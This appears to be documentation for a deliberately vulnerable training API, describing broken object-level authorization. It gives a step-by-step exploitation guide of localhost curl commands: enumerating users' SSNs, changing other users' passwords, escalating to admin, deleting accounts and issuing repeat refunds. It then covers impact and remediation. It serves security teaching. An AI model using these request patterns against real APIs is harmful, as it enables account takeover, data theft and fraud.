API1:2023 Broken Object Level Authorization (BOLA)

CRITICAL SEVERITY

Description

Broken Object Level Authorization (BOLA), also known as Insecure Direct Object Reference (IDOR), occurs when an API endpoint allows access to objects by manipulating the object identifier. This happens when authorization checks are not properly implemented for object-level access.

Affected Files

  • app/routes/users.py
  • app/routes/orders.py
  • app/routes/products.py

Vulnerable Endpoints

Endpoint Method Vulnerability
/api/users/{id} GET, PUT, DELETE Access any user's data by changing ID
/api/users/{id}/orders GET View any user's orders
/api/orders/{id} GET, PUT, DELETE Access any order by changing ID
/api/orders/{id}/refund POST Refund any order

Exploitation Guide

1. Enumerate Users (No Auth Required)

The API exposes all users without authentication:

# Get all users - no authentication required!
curl -X GET http://localhost:5000/api/users

# Response includes sensitive data: passwords, SSN, credit cards

2. Access Another User's Profile

As an authenticated user, access any other user's data by changing the ID:

# Login as regular user
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "john", "password": "password123"}' | jq -r '.token')

# Access admin user (ID 1) data - should be forbidden but isn't!
curl -X GET http://localhost:5000/api/users/1 \
  -H "Authorization: Bearer $TOKEN"

# Access any user (iterate through IDs)
for i in {1..10}; do
  echo "=== User $i ==="
  curl -s http://localhost:5000/api/users/$i | jq '.user.username, .user.email, .user.ssn'
done

3. Modify Another User's Data

Update another user's profile, including their role:

# As user 'john', modify user 'jane' (ID 3)
curl -X PUT http://localhost:5000/api/users/3 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password": "hacked123", "balance": 0}'

# Privilege escalation: Make yourself admin
curl -X PUT http://localhost:5000/api/users/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

4. Delete Another User

# Delete user ID 5 (test user)
curl -X DELETE http://localhost:5000/api/users/5 \
  -H "Authorization: Bearer $TOKEN"

5. Access Other Users' Orders

# View all orders without authentication
curl -X GET http://localhost:5000/api/orders

# View specific user's orders
curl -X GET http://localhost:5000/api/users/2/orders

# Access specific order
curl -X GET http://localhost:5000/api/orders/1

6. Modify/Refund Any Order

# Change order status to 'delivered' without shipping
curl -X PUT http://localhost:5000/api/orders/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "delivered"}'

# Request refund for any order (even others')
curl -X POST http://localhost:5000/api/orders/1/refund \
  -H "Authorization: Bearer $TOKEN"

# Double refund - no check if already refunded!
curl -X POST http://localhost:5000/api/orders/1/refund \
  -H "Authorization: Bearer $TOKEN"

Impact

  • Data Breach: Access to all user data including PII (SSN, credit cards)
  • Privilege Escalation: Any user can become admin
  • Financial Loss: Unauthorized refunds, balance manipulation
  • Account Takeover: Modify other users' passwords
  • Data Destruction: Delete any user account

Remediation

  1. Always verify the authenticated user has permission to access the requested object
  2. Use UUIDs instead of sequential IDs to make enumeration harder
  3. Implement proper ownership checks before any CRUD operation
  4. Log and monitor access patterns for anomaly detection
# Secure implementation example
@users_bp.route('/<int:user_id>', methods=['GET'])
@token_required
def get_user(user_id):
    # ALWAYS check ownership
    if g.current_user_id != user_id and g.current_user_role != 'admin':
        return jsonify({'error': 'Access denied'}), 403
